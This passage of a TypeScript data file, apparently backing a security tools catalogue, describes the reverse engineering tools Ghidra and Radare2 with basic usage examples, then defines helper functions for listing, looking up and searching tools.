        usage: "Ghidra is used to analyze compiled code and understand its functionality through decompilation",
        examples: [
          {
            title: "Start Ghidra",
            code: "ghidraRun"
          },
          {
            title: "Create new project",
            code: "File > New Project"
          },
          {
            title: "Import binary",
            code: "File > Import File"
          }
        ],
        documentation: "Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency. It includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, macOS, and Linux.",
        githubUrl: "https://github.com/NationalSecurityAgency/ghidra",
        tags: ["reverse engineering", "decompiler", "disassembler", "analysis"]
      },
      {
        id: "radare2",
        name: "Radare2",
        description: "Complete framework for reverse-engineering and analyzing binaries",
        category: "Reverse Engineering",
        categoryId: "reverse-engineering",
        installation: "sudo apt install radare2",
        usage: "Radare2 is used for disassembling, debugging, and analyzing binary files",
        examples: [
          {
            title: "Open binary",
            code: "r2 binary.exe"
          },
          {
            title: "Analyze all",
            code: "r2 binary.exe\n[0x00000000]> aaa"
          },
          {
            title: "Show functions",
            code: "r2 binary.exe\n[0x00000000]> afl"
          }
        ],
        documentation: "Radare2 is a complete framework for reverse-engineering and analyzing binaries. It's composed of a set of small utilities that can be used together or independently from the command line. It provides advanced features like binary diffing, binary patching, and scripted reverse engineering.",
        githubUrl: "https://github.com/radareorg/radare2",
        tags: ["reverse engineering", "disassembler", "debugger", "hexadecimal editor", "binary analysis"]
      }
    ]
  }
];

// Helper function to get all tools as a flat array
export const getAllTools = (): Tool[] => {
  return toolsCategories.flatMap(category => category.tools);
};

// Helper function to get a tool by ID
export const getToolById = (id: string): Tool | undefined => {
  return getAllTools().find(tool => tool.id === id);
};

// Helper function to get tools by category
export const getToolsByCategory = (categoryId: string): Tool[] => {
  const category = toolsCategories.find(cat => cat.id === categoryId);
  return category ? category.tools : [];
};

// Helper function to get a category by ID
export const getCategoryById = (id: string): ToolCategory | undefined => {
  return toolsCategories.find(category => category.id === id);
};

// Helper function to search tools
export const searchTools = (query: string): Tool[] => {
  if (!query.trim()) return [];

  const lowerQuery = query.toLowerCase().trim();

  return getAllTools().filter(tool =>
    tool.name.toLowerCase().includes(lowerQuery) ||
    tool.description.toLowerCase().includes(lowerQuery) ||
    (tool.tags && tool.tags.some(tag => tag.toLowerCase().includes(lowerQuery))) ||
    (tool.documentation && tool.documentation.toLowerCase().includes(lowerQuery))
  );
};
